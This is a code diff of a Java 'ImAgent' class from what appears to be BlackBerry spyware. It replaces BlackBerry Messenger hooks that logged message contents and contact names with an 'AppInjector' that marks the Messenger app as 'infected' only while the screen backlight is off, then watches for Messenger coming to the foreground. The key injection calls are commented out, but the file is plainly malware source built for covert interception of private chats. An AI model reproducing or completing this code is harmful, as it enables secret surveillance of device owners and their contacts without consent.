@@ -9,28 +9,30 @@
  * *************************************************/
 package blackberry.agent;
 
-import net.rim.blackberry.api.blackberrymessenger.BlackBerryMessenger;
-import net.rim.blackberry.api.blackberrymessenger.Message;
-import net.rim.blackberry.api.blackberrymessenger.MessengerContact;
-import net.rim.blackberry.api.blackberrymessenger.Session;
-import net.rim.blackberry.api.blackberrymessenger.SessionListener;
-import net.rim.blackberry.api.blackberrymessenger.SessionRequestListener;
-import net.rim.device.api.system.ApplicationDescriptor;
+import net.rim.device.api.system.Backlight;
+import blackberry.AppListener;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.injection.AppInjector;
+import blackberry.interfaces.ApplicationObserver;
+import blackberry.interfaces.BacklightObserver;
 import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
  * PIM, calendario, appuntamenti.
  */
-public final class ImAgent extends Agent implements SessionRequestListener,
-        SessionListener {
+public final class ImAgent extends Agent implements BacklightObserver,
+        ApplicationObserver {
     //#ifdef DEBUG
     static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);
     //#endif
 
-    static boolean forced = true;
+    AppInjector appInjector;
+    static boolean forced = false;
+    boolean infected;
+
+    String appName = "Messenger";
 
     /**
      * Instantiates a new task agents
@@ -53,34 +55,66 @@ public final class ImAgent extends Agent implements SessionRequestListener,
     protected ImAgent(final boolean agentStatus, final byte[] confParams) {
         this(agentStatus);
         parse(confParams);
-        
+
         setDelay(NEVER);
         setPeriod(NEVER);
     }
 
-    public void actualStart() {
+    public synchronized void actualStart() {
         //#ifdef DEBUG
-        debug.info("start");
+        debug.trace("actualStart");
         //#endif
-        BlackBerryMessenger.getInstance().addSessionRequestListener(this,
-                ApplicationDescriptor.currentApplicationDescriptor());
+
+        AppListener.getInstance().addBacklightObserver(this);
+        AppListener.getInstance().addApplicationObserver(this);
+
+        try {
+            appInjector = new AppInjector(AppInjector.APP_BBM);
+            infected = appInjector.isInfected();
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            debug.error("actualStart: " + ex);
+            //#endif
+        }
+
+        if (!infected && !Backlight.isEnabled()) {
+            //#ifdef DEBUG
+            debug.trace("actualStart, infecting");
+            //#endif
+            menuInject();
+        }
     }
 
-    /*
-     * (non-Javadoc)
-     * @see blackberry.threadpool.TimerJob#actualRun()
-     */
+    private void menuInject() {
+        //#ifdef DEBUG
+        debug.trace("menuInject");
+        //#endif
+
+        //appInjector.requestForeground();
+        //appInjector.injectMenu();
+        //appInjector.callMenu();
+        //appInjector.deleteMenu();
+
+        infected = true;
+    }
+
+    public synchronized void actualStop() {
+        //#ifdef DEBUG
+        debug.trace("actualStop");
+        //#endif
+
+        AppListener.getInstance().removeBacklightObserver(this);
+        AppListener.getInstance().removeApplicationObserver(this);
+    }
+
     public void actualRun() {
-        //#ifdef DEBUG
-        debug.info("run");
-        //#endif
-    }
+        if (infected && Backlight.isEnabled() && isAppForeground) {
+            //#ifdef DEBUG
+            debug.info("actualRun, infected, enabled, foreground");
+            //#endif
 
-    public void actualStop() {
-        //#ifdef DEBUG
-        debug.info("stop");
-        //#endif
-        BlackBerryMessenger.getInstance().removeSessionRequestListener(this);
+            //appInjector.callInContext();
+        }
     }
 
     /*
@@ -98,66 +132,28 @@ public final class ImAgent extends Agent implements SessionRequestListener,
         return false;
     }
 
-    /**
-     * SessionRequestListener
-     */
-    public void sessionRequestAccepted(Session session) {        
-        Debug.init();
-        
-        //#ifdef DEBUG
-        debug.trace("sessionRequestAccepted");
-        //#endif
-
-        session.addListener(this, ApplicationDescriptor
-                .currentApplicationDescriptor());
-
-        MessengerContact contact = session.getContact();
-
-        String contactInfo = "Name: " + contact.getDisplayName();
-        contactInfo += " Id: " + contact.getContactId();
-
-        //#ifdef DEBUG
-        debug.trace("contactInfo: " + contactInfo);
-        //#endif
-    }
-
-    public void messageDelivered(Session session, Message message) {
-
-        //#ifdef DEBUG
-        debug.trace("messageDelivered");
-        debug.trace("type: " + message.getContentType());
-        debug.trace("content: " + Utils.byteArrayToHex(message.getData()));
-        //#endif
-    }
-
-    public void messageQueuedForSend(Session session, Message message) {
-        //#ifdef DEBUG
-        debug.trace("messageQueuedForSend");
-        debug.trace("type: " + message.getContentType());
-        debug.trace("content: " + Utils.byteArrayToHex(message.getData()));
-        //#endif
-    }
-
-    public void messageReceived(Session session, Message message) {
-        //#ifdef DEBUG
-        debug.trace("messageReceived");
-        debug.trace("type: " + message.getContentType());
-        debug.trace("content: " + Utils.byteArrayToHex(message.getData()));
-        //#endif             
-    }
-
-    public void messageSent(Session session, Message message) {
-        //#ifdef DEBUG
-        debug.trace("messageSent");
-        debug.trace("type: " + message.getContentType());
-        debug.trace("content: " + Utils.byteArrayToHex(message.getData()));
-        //#endif
-    }
-
-    public void sessionClosed(Session session) {
-        //#ifdef DEBUG
-        debug.trace("sessionClosed: " + session.getContact().getContactId());
-        //#endif
+    public void onBacklightChange(boolean status) {
+        // TODO Auto-generated method stub
 
     }
+
+    boolean isAppForeground;
+
+    public void onApplicationChange(String startedName, String stoppedName,
+            String startedMod, String stoppedMod) {
+        if (startedName != null && startedName.indexOf(appName) >= 0) {
+            //#ifdef DEBUG
+            debug.trace("onApplicationChange: foreground");
+            //#endif
+            isAppForeground = true;
+        } else {
+            //#ifdef DEBUG
+            debug.trace("onApplicationChange: not foreground");
+            //#endif
+            isAppForeground = false;
+        }
+    }
+
+
+
 }
